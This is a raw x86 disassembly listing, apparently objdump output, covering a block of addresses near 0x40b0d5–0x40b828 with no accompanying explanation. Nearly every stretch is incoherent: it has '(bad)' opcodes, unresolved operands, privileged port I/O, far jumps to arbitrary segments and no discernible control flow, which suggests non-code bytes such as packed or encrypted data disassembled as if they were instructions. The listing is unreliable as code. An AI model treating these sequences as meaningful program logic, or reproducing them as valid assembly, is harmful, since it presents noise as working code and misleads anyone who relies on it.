  40b0d5:	add    ch,BYTE PTR [esi-0x13831d80]
  40b0db:	dec    ebp
  40b0dc:	fs out 0x90,al
  40b0df:	pop    esp
  40b0e0:	mov    edi,0xd252d2a8
  40b0e5:	mov    ebx,DWORD PTR [esi]
  40b0e7:	and    eax,0xc8fd3c16
  40b0ec:	mov    ds:0x68e52794,eax
  40b0f1:	call   0x5f2c:0xc90bebcb
  40b0f8:	xor    DWORD PTR [eax],ebx
  40b0fa:	mov    bl,0x65
  40b0fc:	xchg   edi,eax
  40b0fd:	popf   
  40b0fe:	sub    DWORD PTR [edx-0x55b92c2e],edi
  40b104:	nop
  40b105:	sub    eax,0x45d225de
  40b10a:	mov    ds:0x361d5d88,eax
  40b10f:	repz out 0xe5,al
  40b112:	shr    esp,1
  40b114:	div    BYTE PTR ds:0x9088f9b1
  40b11a:	mov    BYTE PTR [ebx],al
  40b11c:	jg     0x40b125
  40b11e:	xchg   esi,eax
  40b11f:	push   ds
  40b120:	repnz dec esi
  40b122:	cmp    al,0x9b
  40b124:	jle    0x40b0c1
  40b126:	lock push ecx
  40b128:	fsubr  DWORD PTR [ebp+0x28ad1405]
  40b12e:	inc    esp
  40b12f:	lods   al,BYTE PTR ds:[esi]
  40b130:	add    dh,bl
  40b132:	ins    BYTE PTR es:[edi],dx
  40b133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b134:	mov    bh,0x31
  40b136:	push   0x52
  40b138:	rcl    BYTE PTR [edx-0x67687643],1
  40b13e:	jecxz  0x40b14f
  40b140:	fiadd  DWORD PTR [edx+0x12]
  40b143:	mov    BYTE PTR [edx+0x48372c11],dh
  40b149:	gs adc edx,eax
  40b14c:	scas   eax,DWORD PTR es:[edi]
  40b14d:	or     BYTE PTR ds:[ebx-0x4385b308],ah
  40b154:	out    dx,al
  40b155:	sbb    ebp,DWORD PTR [eax]
  40b157:	std    
  40b158:	push   esp
  40b159:	xchg   ebp,eax
  40b15a:	mov    ?,edi
  40b15c:	xor    BYTE PTR [ebx],ch
  40b15e:	repnz and DWORD PTR [ecx+edx*2],esp
  40b162:	and    dh,0x1d
  40b165:	aad    0x96
  40b167:	xchg   ebp,eax
  40b168:	rcl    BYTE PTR [edi-0x4a5a8180],0x5a
  40b16f:	retf   0x74c9
  40b172:	les    ecx,FWORD PTR [edi+edi*1+0x68]
  40b176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b177:	ins    DWORD PTR es:[edi],dx
  40b178:	in     eax,dx
  40b179:	jne    0x40b171
  40b17b:	xchg   esp,eax
  40b17c:	and    al,al
  40b17e:	sbb    esp,0xe3955145
  40b184:	fist   WORD PTR ds:0xba1e4140
  40b18a:	sub    DWORD PTR [eax],ecx
  40b18c:	sbb    al,0x72
  40b18e:	inc    edx
  40b18f:	ret    
  40b190:	sbb    edi,ebp
  40b192:	clc    
  40b193:	data16 (bad) 
  40b195:	(bad)  
  40b196:	cli    
  40b197:	pop    edi
  40b198:	loop   0x40b17e
  40b19a:	sbb    eax,0x9b81b60b
  40b19f:	jb     0x40b1e3
  40b1a1:	pop    esp
  40b1a2:	xor    eax,0x70d7c07e
  40b1a7:	sar    DWORD PTR [edi],1
  40b1a9:	cmc    
  40b1aa:	or     edi,DWORD PTR [esi+esi*4]
  40b1ad:	repz daa 
  40b1af:	jecxz  0x40b163
  40b1b1:	lea    eax,[ecx+edi*8+0x4d]
  40b1b5:	xchg   edi,eax
  40b1b6:	aam    0x55
  40b1b8:	jns    0x40b21b
  40b1ba:	sub    BYTE PTR [edx+0x11],dh
  40b1bd:	addr16 xor eax,0x1b268819
  40b1c3:	xor    ebp,DWORD PTR [esi-0x32]
  40b1c6:	sub    DWORD PTR [edx+ecx*2],esp
  40b1c9:	sti    
  40b1ca:	inc    edx
  40b1cb:	sbb    edi,DWORD PTR [edx-0x16439de8]
  40b1d1:	mov    ebx,DWORD PTR [edx-0x54de65a7]
  40b1d7:	int    0x17
  40b1d9:	gs aaa 
  40b1db:	lock cmp BYTE PTR es:[edi+0x23],dl
  40b1e0:	or     BYTE PTR [edi+edx*8],cl
  40b1e3:	sub    DWORD PTR [ecx+0x20],esp
  40b1e6:	and    eax,0x2286d58b
  40b1eb:	add    eax,0x42e8d2bd
  40b1f0:	adc    DWORD PTR [eax+edx*4+0x21],0x1ba9a978
  40b1f8:	cmp    esi,ecx
  40b1fa:	fist   WORD PTR [ecx+ebx*8-0x246491f]
  40b201:	jmp    0x8201cc22
  40b206:	bound  ecx,QWORD PTR [eax-0x1bb3cf15]
  40b20c:	ds xor dh,dl
  40b20f:	xchg   edx,eax
  40b210:	mul    BYTE PTR [ebx-0x6921a93b]
  40b216:	fidiv  DWORD PTR [esi+0x73]
  40b219:	pop    ss
  40b21a:	dec    ebx
  40b21b:	dec    edx
  40b21c:	in     eax,0xd7
  40b21e:	fnsave [ecx]
  40b220:	cdq    
  40b221:	shl    DWORD PTR [edi-0x33],0x8d
  40b225:	popf   
  40b226:	dec    ecx
  40b227:	popf   
  40b228:	push   es
  40b229:	cwde   
  40b22a:	leave  
  40b22b:	int    0xb6
  40b22d:	rcr    DWORD PTR [ecx],1
  40b22f:	or     ebx,ebp
  40b231:	and    esp,DWORD PTR [esi+0x33]
  40b234:	js     0x40b2aa
  40b236:	(bad)  
  40b237:	sub    dl,BYTE PTR [ecx-0x117dbb14]
  40b23d:	ss mov eax,0x95a80817
  40b243:	push   0x22
  40b245:	inc    ebx
  40b246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b247:	add    BYTE PTR [ebp+ebx*8+0x65],dl
  40b24b:	loop   0x40b25b
  40b24d:	sub    eax,0xda2788f9
  40b252:	(bad)  
  40b254:	or     ah,al
  40b256:	not    DWORD PTR [ecx+0xc]
  40b259:	inc    ecx
  40b25a:	inc    eax
  40b25b:	or     BYTE PTR [eax-0x2a],ch
  40b25e:	call   0xb26eb1e
  40b263:	cmc    
  40b264:	(bad)  
  40b265:	xchg   ecx,eax
  40b266:	mov    ebp,0x46a935d
  40b26b:	cmc    
  40b26c:	ins    BYTE PTR es:[edi],dx
  40b26d:	lock push cs
  40b26f:	jbe    0x40b2a1
  40b271:	ds leave 
  40b273:	fs pusha 
  40b275:	ins    BYTE PTR es:[edi],dx
  40b276:	les    edi,FWORD PTR [esi+0x53c2bbce]
  40b27c:	push   esp
  40b27d:	pop    esp
  40b27e:	xchg   ebp,eax
  40b27f:	mov    al,0x1c
  40b281:	add    DWORD PTR [ecx-0x1b],esp
  40b284:	test   BYTE PTR [edx+0x5f],al
  40b287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b288:	(bad)  
  40b289:	jecxz  0x40b21a
  40b28b:	sbb    al,0x6b
  40b28d:	adc    BYTE PTR [edi],0x8d
  40b290:	out    dx,eax
  40b291:	je     0x40b241
  40b293:	sub    al,BYTE PTR [ecx+ecx*4+0x50]
  40b297:	or     esi,edi
  40b299:	cmp    esi,DWORD PTR [ebp+0x20]
  40b29c:	xchg   BYTE PTR [ebp+0x57f12fa6],ch
  40b2a2:	jl     0x40b31f
  40b2a4:	outs   dx,BYTE PTR ds:[esi]
  40b2a5:	mov    BYTE PTR [ebx+ecx*2-0x39],dl
  40b2a9:	ret    0x1f0
  40b2ac:	sbb    ecx,DWORD PTR [edi-0x73]
  40b2af:	rcr    eax,1
  40b2b1:	int3   
  40b2b2:	in     eax,0xfb
  40b2b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2b5:	popa   
  40b2b6:	in     eax,dx
  40b2b7:	jne    0x40b31c
  40b2b9:	aaa    
  40b2ba:	cs (bad) 
  40b2bc:	sbb    DWORD PTR [ecx+ecx*1+0x13],edx
  40b2c0:	in     al,0x51
  40b2c2:	mov    ah,0xfa
  40b2c4:	jbe    0x40b26e
  40b2c6:	push   esi
  40b2c7:	or     eax,0x131e23a8
  40b2cc:	retf   
  40b2cd:	mov    BYTE PTR [edx-0x58],ah
  40b2d0:	dec    ebp
  40b2d1:	push   ebx
  40b2d2:	push   cs
  40b2d3:	scas   al,BYTE PTR es:[edi]
  40b2d4:	mov    ds:0xdd92902a,eax
  40b2d9:	rcl    BYTE PTR cs:[ecx],cl
  40b2dc:	mov    eax,ds:0x5ad5b12e
  40b2e1:	out    0x6,eax
  40b2e3:	dec    ebx
  40b2e4:	xchg   DWORD PTR [ecx+0x7f],ecx
  40b2e7:	mov    WORD PTR [ebx+edx*4],fs
  40b2ea:	shl    DWORD PTR [ecx+0xe],cl
  40b2ed:	scas   eax,DWORD PTR es:[edi]
  40b2ee:	push   edi
  40b2ef:	out    0xd4,al
  40b2f1:	repz popf 
  40b2f3:	das    
  40b2f4:	fcom   QWORD PTR [edx]
  40b2f6:	push   edx
  40b2f8:	push   0xffffff91
  40b2fa:	out    0x2f,al
  40b2fc:	hlt    
  40b2fd:	rcr    BYTE PTR [ecx+0x4f],0xe6
  40b301:	imul   ecx,DWORD PTR [edi],0xb8df69c
  40b307:	rcl    al,0xc5
  40b30a:	jp     0x40b297
  40b30c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b30d:	gs inc ecx
  40b30f:	add    BYTE PTR [esi+edx*2-0x791522b0],bl
  40b316:	push   ebp
  40b317:	lods   al,BYTE PTR ds:[esi]
  40b318:	int    0x86
  40b31a:	imul   edi,DWORD PTR [ebp+0x36],0xbf63acd2
  40b321:	cs pop ebp
  40b323:	in     eax,0x9a
  40b325:	popa   
  40b326:	clc    
  40b327:	neg    eax
  40b329:	jl     0x40b33c
  40b32b:	dec    ebx
  40b32c:	test   DWORD PTR [edi+edx*8-0x12fcca97],edx
  40b333:	in     al,0x45
  40b335:	add    al,0x1c
  40b337:	ror    DWORD PTR [edi+0x18],cl
  40b33a:	leave  
  40b33b:	push   es
  40b33c:	and    bl,0x2b
  40b33f:	dec    edx
  40b340:	xchg   esp,eax
  40b341:	dec    esp
  40b342:	xchg   esi,eax
  40b343:	cmp    eax,0xf21d6b01
  40b348:	sub    cl,BYTE PTR [esp+ebp*8-0x2d7428ff]
  40b34f:	bound  edx,QWORD PTR [ebx-0x74]
  40b352:	dec    edi
  40b353:	loope  0x40b323
  40b355:	iret   
  40b356:	mov    al,ds:0xe10494aa
  40b35b:	xchg   esi,eax
  40b35c:	jns    0x40b3a0
  40b35e:	call   DWORD PTR [ebp+ebp*8+0x68]
  40b362:	xchg   esi,eax
  40b363:	mov    edi,0x7a89f019
  40b368:	mov    eax,DWORD PTR [edx+0x13ec1e4d]
  40b36e:	out    0x3d,eax
  40b370:	dec    ebx
  40b371:	mov    bl,0xa5
  40b373:	mov    dh,0x22
  40b375:	mov    ah,0x3a
  40b377:	inc    eax
  40b378:	sbb    DWORD PTR [edi+0x53],ebp
  40b37b:	es jbe 0x40b304
  40b37e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b37f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b380:	(bad)  
  40b381:	popa   
  40b382:	and    DWORD PTR [edi],ebp
  40b384:	popf   
  40b385:	push   ss
  40b386:	sbb    DWORD PTR [ecx-0x2b300c4a],0xffffffc0
  40b38d:	push   ss
  40b38e:	mov    bh,al
  40b390:	xchg   ebx,eax
  40b391:	pop    ecx
  40b392:	fdivr  QWORD PTR [edi+0x2d815b72]
  40b398:	out    0x4d,eax
  40b39a:	xor    DWORD PTR [ecx+0x27],ebx
  40b39d:	bound  ebx,QWORD PTR [eax+0x29]
  40b3a0:	cmp    eax,0x236dad39
  40b3a5:	out    0x1e,al
  40b3a7:	inc    ecx
  40b3a8:	ficomp DWORD PTR [esi+ebp*2-0x27]
  40b3ac:	fld    TBYTE PTR [eiz*1+0x2dd2049f]
  40b3b3:	pop    edi
  40b3b4:	ins    BYTE PTR es:[edi],dx
  40b3b5:	inc    ebx
  40b3b6:	cmp    eax,0x50bf1b9f
  40b3bb:	std    
  40b3bc:	xchg   edi,eax
  40b3bd:	scas   eax,DWORD PTR es:[edi]
  40b3be:	inc    ebx
  40b3bf:	fcmovnu st,st(3)
  40b3c1:	mov    ah,BYTE PTR [ebx-0x4c7212bd]
  40b3c7:	jg     0x40b418
  40b3c9:	sbb    BYTE PTR [eax],al
  40b3cb:	add    esi,DWORD PTR [ebp-0x49]
  40b3ce:	cmp    ah,BYTE PTR [esi+0x78]
  40b3d1:	push   0xffffffbb
  40b3d3:	xor    al,0x33
  40b3d5:	dec    ecx
  40b3d6:	data16 shr BYTE PTR [ecx],1
  40b3d9:	xchg   DWORD PTR [edx],edi
  40b3db:	in     al,0x6f
  40b3dd:	aas    
  40b3de:	add    ah,bh
  40b3e0:	jge    0x40b3b3
  40b3e2:	xchg   ecx,eax
  40b3e3:	test   eax,0x986a3fe
  40b3e8:	adc    al,0xa6
  40b3ea:	ds pop edx
  40b3ec:	xchg   edi,eax
  40b3ed:	adc    esi,edx
  40b3ef:	xor    eax,0x72a5a7b3
  40b3f4:	push   esi
  40b3f5:	(bad)  
  40b3f6:	add    BYTE PTR fs:[ebx+0x7a],bh
  40b3fa:	fs mov esp,0x9c199569
  40b400:	pusha  
  40b401:	int    0xd7
  40b403:	mov    ds:0x91b798f0,al
  40b408:	jge    0x40b426
  40b40a:	pop    ebp
  40b40b:	inc    ebp
  40b40c:	mov    ah,0x63
  40b40e:	popa   
  40b40f:	addr16 mov edx,0xa746b92d
  40b415:	sub    al,0x1b
  40b417:	xor    BYTE PTR [edi],dl
  40b419:	retf   0xfb21
  40b41c:	cmp    eax,DWORD PTR [edx+esi*4]
  40b41f:	mov    ?,WORD PTR [ebx-0x361218bf]
  40b425:	call   FWORD PTR [edi+0x35]
  40b428:	jnp    0x40b43f
  40b42a:	enter  0xabec,0xcb
  40b42e:	jne    0x40b409
  40b430:	cmp    esp,eax
  40b432:	ucomiss xmm4,xmm1
  40b435:	mov    gs,WORD PTR [ecx+esi*8-0x7a]
  40b439:	sti    
  40b43a:	aam    0x7
  40b43c:	pushf  
  40b43d:	(bad)  
  40b43e:	dec    eax
  40b43f:	ins    DWORD PTR es:[edi],dx
  40b440:	jg     0x40b42d
  40b442:	cdq    
  40b443:	out    dx,eax
  40b444:	inc    esp
  40b445:	retf   
  40b446:	xchg   esi,eax
  40b447:	dec    eax
  40b448:	xchg   DWORD PTR es:[ebx*8+0x5762ec4d],eax
  40b450:	int3   
  40b451:	and    al,0x89
  40b454:	loopne 0x40b3df
  40b456:	cdq    
  40b457:	cmovnp ebp,ebx
  40b45a:	mov    DWORD PTR [esi+esi*4],edi
  40b45d:	(bad)
  40b461:	inc    ebx
  40b462:	or     BYTE PTR [eax+0x5c3a346f],dl
  40b468:	loop   0x40b41e
  40b46a:	add    BYTE PTR [ebx+0x11145f4],ch
  40b470:	push   ss
  40b471:	imul   ebx,ecx,0x65
  40b474:	push   esp
  40b475:	jmp    0x441a:0x359df32
  40b47c:	clc    
  40b47d:	xchg   esi,eax
  40b47e:	int3   
  40b47f:	cli    
  40b480:	xor    dh,BYTE PTR ds:0xe6645cde
  40b486:	pop    es
  40b487:	call   0x1d1b:0xf4c8b82e
  40b48e:	mov    ecx,0xda4d685e
  40b493:	jmp    0x5c23:0x1c5effae
  40b49a:	cmp    eax,0x4f32828
  40b49f:	dec    ebp
  40b4a0:	out    0xa1,eax
  40b4a2:	das    
  40b4a3:	pusha  
  40b4a4:	sbb    al,0x19
  40b4a6:	pop    esp
  40b4a7:	inc    esi
  40b4a8:	jecxz  0x40b4be
  40b4aa:	jp     0x40b503
  40b4ac:	rcl    BYTE PTR [edi],0xd8
  40b4af:	mov    esi,0x89fc6f4e
  40b4b4:	sbb    eax,0x9d25bee8
  40b4b9:	sub    ebx,esi
  40b4bb:	jge    0x40b4ee
  40b4bd:	add    edi,ecx
  40b4bf:	cli    
  40b4c0:	push   0x78
  40b4c2:	adc    dh,BYTE PTR [ebx-0xe54d808]
  40b4c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4c9:	cmp    DWORD PTR [edi+edi*1+0x669f1460],edi
  40b4d0:	in     al,dx
  40b4d1:	pop    ecx
  40b4d2:	ror    BYTE PTR [edi-0xc],cl
  40b4d5:	js     0x40b47a
  40b4d7:	xchg   edx,eax
  40b4d8:	loop   0x40b4bf
  40b4da:	mov    ebx,0x8c04e9b5
  40b4df:	lahf   
  40b4e0:	xchg   esi,eax
  40b4e1:	xor    bl,BYTE PTR [edx+0x9]
  40b4e4:	add    al,0x64
  40b4e6:	dec    edi
  40b4e7:	pop    eax
  40b4e8:	nop
  40b4e9:	adc    ch,dl
  40b4eb:	jne    0x40b4e5
  40b4ed:	mov    ebx,0xb29e252a
  40b4f2:	mov    dh,0xff
  40b4f4:	pop    esi
  40b4f5:	and    ecx,DWORD PTR [eax+edi*8+0x25]
  40b4f9:	jb     0x40b545
  40b4fb:	in     al,dx
  40b4fc:	clc    
  40b4fd:	mov    bl,BYTE PTR [eax+0x1a]
  40b500:	mov    DWORD PTR ds:0x9ffd76b7,eax
  40b506:	mov    esi,0x3be0b2f4
  40b50b:	repz aas 
  40b50d:	cmp    ebp,ecx
  40b50f:	push   ss
  40b510:	pop    esi
  40b511:	fistp  QWORD PTR [ebp-0x2bde430b]
  40b517:	xlat   BYTE PTR ds:[ebx]
  40b518:	add    BYTE PTR [eax-0x27],dh
  40b51b:	push   edi
  40b51c:	mov    ecx,0xf0573a53
  40b521:	sbb    bl,bh
  40b523:	mov    eax,ds:0xb32fc5f
  40b528:	aad    0x14
  40b52a:	pop    ebx
  40b52b:	jbe    0x40b508
  40b52d:	dec    edi
  40b52e:	mov    eax,0x154c5dfb
  40b533:	mov    cl,0xff
  40b535:	imul   BYTE PTR [ecx-0x48756756]
  40b53b:	xchg   edi,eax
  40b53c:	dec    esi
  40b53d:	and    ebx,DWORD PTR [edx+0x5247fb44]
  40b543:	sub    eax,0x5a92d508
  40b548:	jmp    0x4d64bf5c
  40b54d:	jg     0x40b55f
  40b54f:	dec    ecx
  40b550:	popa   
  40b551:	push   es
  40b552:	push   0x9da50093
  40b557:	nop
  40b558:	jmp    0x40b5b8
  40b55a:	adc    al,0x8b
  40b55c:	(bad)  
  40b55e:	cwde   
  40b55f:	or     ecx,DWORD PTR [edx]
  40b561:	or     bl,BYTE PTR [ecx+0x4f9b51fe]
  40b567:	(bad)  
  40b568:	rcl    eax,1
  40b56a:	or     cl,dl
  40b56c:	test   BYTE PTR [edi],cl
  40b56e:	sub    dl,BYTE PTR [esi]
  40b570:	mov    ebp,0xdf379660
  40b575:	jecxz  0x40b5a1
  40b577:	add    al,BYTE PTR [eax]
  40b579:	jno    0x40b5b6
  40b57b:	jmp    0xd1ec7fd3
  40b580:	sub    al,0x9c
  40b582:	cmc    
  40b583:	fistp  DWORD PTR [ebx-0x3b]
  40b586:	dec    edx
  40b587:	cmp    ecx,edx
  40b589:	bound  esp,QWORD PTR [eax]
  40b58b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b58c:	cli    
  40b58d:	jbe    0x40b5ec
  40b58f:	pop    esi
  40b590:	loop   0x40b587
  40b592:	enter  0x98e,0x82
  40b596:	data16 out dx,al
  40b598:	jle    0x40b56b
  40b59a:	popa   
  40b59b:	dec    edx
  40b59c:	push   edi
  40b59d:	ret    0x365f
  40b5a0:	ret    0x14e0
  40b5a3:	jle    0x40b584
  40b5a5:	mov    dh,0x89
  40b5a7:	(bad)  
  40b5a8:	mov    ch,0x95
  40b5aa:	xchg   ecx,eax
  40b5ab:	jle    0x40b5df
  40b5ad:	aam    0xe2
  40b5af:	fwait
  40b5b0:	push   ecx
  40b5b1:	(bad)  
  40b5b2:	push   eax
  40b5b3:	aas    
  40b5b4:	dec    edi
  40b5b5:	add    dl,al
  40b5b7:	retf   0x1c75
  40b5ba:	bnd call 0x57aaf0e7
  40b5c0:	daa    
  40b5c1:	mov    ss,WORD PTR [edx-0x36073c49]
  40b5c7:	cmc    
  40b5c8:	aad    0x58
  40b5ca:	gs jbe 0x40b555
  40b5cd:	dec    esp
  40b5ce:	mov    al,ds:0x20d63ddd
  40b5d3:	pop    ebx
  40b5d4:	ins    DWORD PTR es:[edi],dx
  40b5d5:	inc    eax
  40b5d6:	icebp  
  40b5d7:	mov    al,0xba
  40b5d9:	nop    DWORD PTR [ecx-0x4931dfee]
  40b5e0:	and    DWORD PTR [edi-0x65],0xffffffa6
  40b5e4:	pop    esp
  40b5e5:	hlt    
  40b5e6:	jo     0x40b5da
  40b5e8:	ror    eax,0x20
  40b5eb:	lds    edx,FWORD PTR [ecx]
  40b5ed:	mov    WORD PTR [ebx+edx*8+0x3049ba5],ss
  40b5f4:	dec    ebp
  40b5f5:	push   ds
  40b5f6:	outs   dx,BYTE PTR ds:[esi]
  40b5f7:	push   edi
  40b5f8:	(bad)  
  40b5f9:	scas   eax,DWORD PTR es:[edi]
  40b5fa:	sub    DWORD PTR [edi+0x44],edi
  40b5fd:	jnp    0x40b5a7
  40b5ff:	pushf  
  40b600:	cli    
  40b601:	ret    0x5f1f
  40b604:	pop    ecx
  40b605:	cwde   
  40b606:	sahf   
  40b607:	xchg   edi,eax
  40b608:	outs   dx,DWORD PTR ds:[esi]
  40b609:	push   edx
  40b60a:	jge    0x40b67c
  40b60c:	push   es
  40b60d:	push   0x3e0e2d8e
  40b612:	and    al,0x2
  40b614:	inc    esi
  40b615:	enter  0xf710,0xd7
  40b619:	ret    0x6ddf
  40b61c:	fdiv   DWORD PTR [ebx+0x56]
  40b61f:	inc    ebx
  40b620:	fist   WORD PTR [eax+0x2d7fd16d]
  40b626:	jmp    0xd4e99d30
  40b62b:	push   ds
  40b62c:	xchg   DWORD PTR [edi-0x2c],edx
  40b62f:	sub    DWORD PTR [esi],ebp
  40b631:	daa    
  40b632:	call   0x8c3:0x99cf14ad
  40b639:	inc    ecx
  40b63a:	jns    0x40b5e4
  40b63c:	sbb    ax,0xd559
  40b640:	mov    eax,DWORD PTR ds:0xd98fdea1
  40b646:	dec    eax
  40b647:	cmp    eax,0x7dab1578
  40b64c:	inc    ebp
  40b64d:	stos   DWORD PTR es:[edi],eax
  40b64e:	pusha  
  40b64f:	or     BYTE PTR [ebx+0x45],cl
  40b652:	stos   BYTE PTR es:[edi],al
  40b653:	imul   ebp,DWORD PTR [esi+0x57f53182],0xfffffffd
  40b65a:	dec    edx
  40b65b:	xor    DWORD PTR [eax-0x57],edi
  40b65e:	push   edx
  40b65f:	inc    ebp
  40b660:	mov    ebp,0xe965fae
  40b665:	mov    eax,ds:0x9180e72a
  40b66a:	push   0x7b4f4836
  40b66f:	mov    ch,0x77
  40b671:	pusha  
  40b672:	jne    0x40b6c7
  40b674:	add    al,0x9d
  40b676:	test   al,0xe9
  40b678:	dec    ecx
  40b679:	dec    edi
  40b67a:	xlat   BYTE PTR ds:[ebx]
  40b67b:	sub    edi,eax
  40b67d:	dec    ebx
  40b67e:	or     al,0x73
  40b680:	aam    0xd7
  40b682:	sahf   
  40b683:	inc    ebx
  40b684:	repz out dx,eax
  40b686:	mul    DWORD PTR [esi+0x444aaa53]
  40b68c:	mov    ecx,0x3cdef179
  40b691:	lea    edi,[ebx-0x3f]
  40b694:	fld    QWORD PTR [ecx+0x13]
  40b697:	dec    ecx
  40b699:	add    bl,al
  40b69b:	retf   
  40b69c:	or     eax,0x67e10433
  40b6a1:	fisub  WORD PTR [edi]
  40b6a3:	jne    0x40b634
  40b6a5:	std    
  40b6a6:	mov    edi,0x290df9c6
  40b6ab:	(bad)  
  40b6ac:	jnp    0x40b6a7
  40b6ae:	dec    eax
  40b6af:	outs   dx,DWORD PTR ds:[esi]
  40b6b0:	mov    ch,0x3a
  40b6b2:	mov    dh,0xba
  40b6b4:	shl    BYTE PTR [esi+0x5b6ae03d],cl
  40b6ba:	stos   BYTE PTR es:[edi],al
  40b6bb:	inc    eax
  40b6bc:	mov    ebx,0x4448dfa8
  40b6c1:	ret    0x626c
  40b6c4:	test   dl,cl
  40b6c6:	sbb    DWORD PTR ds:0xa3fdee59,edx
  40b6cc:	sysexit 
  40b6ce:	retf   0x35ab
  40b6d1:	lds    ebp,FWORD PTR [eax-0x7bc465d1]
  40b6d7:	cs je  0x40b6d8
  40b6da:	mov    esi,0xaf789d0
  40b6df:	sbb    bh,BYTE PTR [esi+0x328e5bae]
  40b6e5:	das    
  40b6e6:	iret   
  40b6e7:	push   ecx
  40b6e8:	(bad)  
  40b6e9:	adc    edx,edx
  40b6eb:	mov    BYTE PTR [esi+0x16],bl
  40b6ee:	repz xor edx,edi
  40b6f1:	add    al,0x80
  40b6f3:	mov    bl,al
  40b6f5:	push   es
  40b6f6:	sbb    BYTE PTR ss:[ebx+0x49364cdc],0x8f
  40b6fe:	mov    bl,0x32
  40b700:	jp     0x40b705
  40b702:	stos   DWORD PTR es:[edi],eax
  40b703:	adc    al,0x36
  40b705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b706:	push   esp
  40b707:	loop   0x40b70b
  40b709:	icebp  
  40b70a:	xor    BYTE PTR [esi+ecx*4+0x45],0xaa
  40b70f:	and    al,0xc7
  40b711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b712:	xchg   ch,ah
  40b714:	ins    BYTE PTR es:[edi],dx
  40b715:	out    dx,al
  40b716:	push   ecx
  40b717:	lds    edx,FWORD PTR [esi+0x66]
  40b71a:	cdq    
  40b71b:	cmp    BYTE PTR [edx+0x3d],0xf
  40b71f:	xor    eax,0xae806c87
  40b724:	inc    edi
  40b725:	or     ebp,ecx
  40b727:	xchg   edi,eax
  40b728:	cdq    
  40b729:	mov    bl,BYTE PTR [esi]
  40b72b:	mov    esp,ds
  40b72d:	in     eax,dx
  40b72e:	jb     0x40b7a0
  40b730:	and    DWORD PTR [edi+0x23011ab1],edi
  40b736:	sub    eax,0xd14b812b
  40b73c:	sub    eax,0x28761c57
  40b741:	and    eax,0x88f53aeb
  40b746:	xchg   esp,eax
  40b747:	push   ds
  40b748:	mov    bh,0x57
  40b74a:	xor    eax,0x5181411c
  40b74f:	sub    BYTE PTR [edx],0xee
  40b752:	jo     0x40b706
  40b754:	mov    ah,0x22
  40b756:	cmp    DWORD PTR [edx+ecx*4+0x20],esi
  40b75a:	mov    ecx,0x3bb9ba9b
  40b75f:	sub    al,0xd4
  40b761:	and    BYTE PTR [eax-0x1f],bh
  40b764:	lahf   
  40b765:	in     eax,dx
  40b766:	iret   
  40b767:	das    
  40b768:	sbb    al,0xcf
  40b76a:	pop    ebp
  40b76b:	push   cs
  40b76c:	add    al,0x7f
  40b76e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b76f:	fnsave [ecx]
  40b771:	mov    ecx,ecx
  40b773:	or     BYTE PTR [esi],bl
  40b775:	stos   BYTE PTR es:[edi],al
  40b776:	and    ch,BYTE PTR [edi+ecx*2+0x41696350]
  40b77d:	dec    esi
  40b77e:	test   DWORD PTR [eax],esp
  40b780:	push   ecx
  40b781:	fdivr  QWORD PTR [edi-0x71]
  40b784:	idiv   esi
  40b786:	sar    ch,cl
  40b788:	call   0x628b:0x431b71f2
  40b78f:	cmp    eax,0xb8a459ce
  40b794:	jle    0x40b770
  40b796:	jno    0x40b7ab
  40b798:	sbb    edx,ebx
  40b79a:	loope  0x40b804
  40b79c:	ja     0x40b745
  40b79e:	bound  ecx,QWORD PTR [esi-0x6]
  40b7a1:	out    dx,eax
  40b7a2:	aas    
  40b7a3:	js     0x40b738
  40b7a5:	pop    ebx
  40b7a6:	push   0xe0e3238b
  40b7ab:	sbb    BYTE PTR [esi],dl
  40b7ad:	fmul   st,st(6)
  40b7af:	jmp    0x40b80b
  40b7b1:	mov    al,dh
  40b7b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7b4:	add    edx,0x3d
  40b7b7:	outs   dx,BYTE PTR ds:[esi]
  40b7b8:	cmp    DWORD PTR [edx+0x672eab2e],ebx
  40b7be:	je     0x40b749
  40b7c0:	mov    eax,0x43bf23c9
  40b7c5:	not    BYTE PTR [eax-0x46]
  40b7c8:	dec    esi
  40b7c9:	lock fsub QWORD PTR [eax+0x4f]
  40b7cd:	sub    edi,DWORD PTR [ebx]
  40b7cf:	cmp    DWORD PTR [ecx],0x7b
  40b7d2:	fwait
  40b7d3:	inc    edx
  40b7d4:	hlt    
  40b7d5:	push   edi
  40b7d6:	jmp    0xd2745a3c
  40b7db:	pop    esi
  40b7dc:	sbb    cl,BYTE PTR [eax+0x12d2e7e]
  40b7e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7e3:	bound  esi,QWORD PTR [ebx-0x45]
  40b7e6:	inc    edx
  40b7e7:	outs   dx,DWORD PTR ds:[esi]
  40b7e8:	es xor al,0x1a
  40b7eb:	mov    esp,0x4ec101e0
  40b7f0:	test   al,0xc9
  40b7f2:	mov    BYTE PTR [eax+0x76],al
  40b7f5:	xchg   esi,eax
  40b7f6:	(bad)  
  40b7f7:	pushf  
  40b7f8:	pop    edi
  40b7f9:	arpl   bx,sp
  40b7fb:	neg    DWORD PTR ds:[si-0x790c]
  40b801:	jmp    0x40b878
  40b803:	(bad)  
  40b804:	jno    0x40b7f3
  40b806:	jae    0x40b849
  40b808:	pusha  
  40b809:	test   al,0x68
  40b80b:	sbb    eax,0x2556aaf3
  40b810:	inc    esi
  40b811:	js     0x40b793
  40b813:	retf   0xef6f
  40b816:	push   0x42
  40b818:	dec    ecx
  40b819:	cmp    bh,BYTE PTR [esi]
  40b81b:	cmp    esi,DWORD PTR [edx-0x1e]
  40b81e:	cs inc edi
  40b820:	ret    0x90d1
  40b823:	xchg   ebp,eax
  40b824:	sub    al,0x58
  40b826:	jbe    0x40b840
  40b828:	cmp    eax,0xd6d0daac
